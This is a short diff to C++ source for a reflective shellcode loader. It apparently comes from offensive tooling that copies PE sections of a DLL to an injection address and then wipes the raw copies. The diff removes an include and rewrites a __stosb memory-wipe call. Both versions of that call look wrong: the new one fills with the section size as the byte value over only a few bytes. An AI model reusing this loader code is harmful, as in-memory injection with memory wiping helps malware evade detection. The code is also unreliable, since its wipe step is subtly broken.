@@ -1,6 +1,5 @@
 #include "../headers/reflection.h"
 #include "utils/headers/CRTdefs.h"
-#include "API/headers/api.h"
 
 #include "intrin.h"
 
@@ -47,7 +46,7 @@ void* ReflectiveShellcodeLdr(void* pParam, API::APIResolver &resolver)
 	PIMAGE_SECTION_HEADER pImgSectHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
 	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
 		__movsb(reinterpret_cast<PBYTE>(ULONG_PTR(pInjectionAddress) + pImgSectHdr[i].VirtualAddress), reinterpret_cast<const BYTE*>(ULONG_PTR(uDllAddress + pImgSectHdr[i].PointerToRawData)), pImgSectHdr[i].SizeOfRawData);
-		__stosb(reinterpret_cast<PBYTE>(ULONG_PTR(uDllAddress + pImgSectHdr[i].PointerToRawData)), pImgSectHdr[i].SizeOfRawData);
+		__stosb(reinterpret_cast<PBYTE>(ULONG_PTR(uDllAddress + pImgSectHdr[i].PointerToRawData)), pImgSectHdr[i].SizeOfRawData, sizeof(pImgSectHdr[i].SizeOfRawData));
 	}
 
 
